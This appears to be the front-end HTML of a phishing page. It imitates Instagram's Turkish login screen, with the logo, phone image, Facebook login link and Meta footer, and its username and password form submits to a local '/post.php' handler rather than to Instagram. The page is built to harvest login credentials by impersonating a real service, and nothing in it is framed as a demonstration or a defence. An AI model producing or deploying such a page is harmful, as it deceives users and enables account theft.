<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body, html { margin:0; padding:0; min-height:100vh; background:#fff; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; display:flex; flex-direction:column; }
        
        .container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px 0;
            max-width: 935px;
            margin: 0 auto;
            gap: 80px;
        }

        .phone-wrapper { width: 380px; flex-shrink: 0; }
        .phone-wrapper img { width: 100%; height: auto; display: block; }

        .login-wrapper { width: 350px; text-align: center; }
        .login-box { background: white; padding: 40px 40px; margin-bottom: 10px; }
        .logo img { width: 175px; margin-bottom: 24px; }
        input { width:100%; padding:12px 16px; margin:6px 0; border:1px solid #dbdbdb; border-radius:6px; background:#fafafa; font-size:14px; }
        button { width:100%; padding:10px; margin:16px 0 10px; background:#0095f6; color:white; border:none; border-radius:8px; font-weight:600; font-size:14px; cursor:pointer; }
        button:hover { background:#1877f2; }
        .or { position:relative; margin:20px 0; color:#8e8e8e; font-size:13px; }
        .or::before { content:""; position:absolute; top:50%; left:0; right:0; height:1px; background:#dbdbdb; }
        .or span { background:white; padding:0 18px; }
        .fb { color:#385185; font-weight:600; text-decoration:none; }
        .forgot { color:#00376b; font-size:12px; margin-top:15px; display:block; text-decoration:none; }

        /* ALT KISIM – HER ZAMAN GÖRÜNÜR */
        .instagram-footer {
            padding: 38px 20px;
            text-align: center;
            color: #8e8e8e;
            font-size: 12px;
            line-height: 1.5;
            flex-shrink: 0;
        }
        .instagram-footer a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 10px;
            white-space: nowrap;
        }
        .instagram-footer a:hover {
            text-decoration: underline;
            color: #00376b;
        }
        .copyright {
            margin-top: 20px;
            color: #8e8e8e;
        }

        @media (max-width: 900px) {
            .container { flex-direction: column; gap: 30px; padding: 20px; }
            .phone-wrapper { display: none; }
            .instagram-footer a { margin: 0 6px; font-size: 11px; }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="phone-wrapper">
        <img src="images/instagramImage.png" alt="Instagram">
    </div>

    <div class="login-wrapper">
        <div class="login-box">
            <div class="logo">
                <img src="images/instagramLogo.png" alt="Instagram">
            </div>

            <form action="/post.php" method="POST">
                <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required autocomplete="username">
                <input type="password" name="password" placeholder="Şifre" required autocomplete="current-password">
                <button type="submit">Giriş Yap</button>
            </form>

            <div class="or"><span>VEYA</span></div>
            <a href="#" class="fb">Facebook ile Giriş Yap</a>
            <a href="#" class="forgot">Şifreni mi unuttun?</a>
        </div>
    </div>
</div>

<!-- ALT KISIM – ARTIK %100 GÖRÜNÜYOR -->
<div class="instagram-footer">
    <div>
        <a href="#">Meta</a>
        <a href="#">Hakkında</a>
        <a href="#">Blog</a>
        <a href="#">İş İlanları</a>
        <a href="#">Yardım</a>
        <a href="#">API</a>
        <a href="#">Gizlilik</a>
        <a href="#">Şartlar</a>
        <a href="#">Konumlar</a>
        <a href="#">Instagram Lite</a>
        <a href="#">Threads</a>
        <a href="#">Kişi yükleme ve doğrulanmamış kişiler</a>
        <a href="#">Meta Verified</a>
    </div>
    <div class="copyright">
        Türkçe ↓ © 2025 Instagram from Meta
    </div>
</div>

</body>
</html>
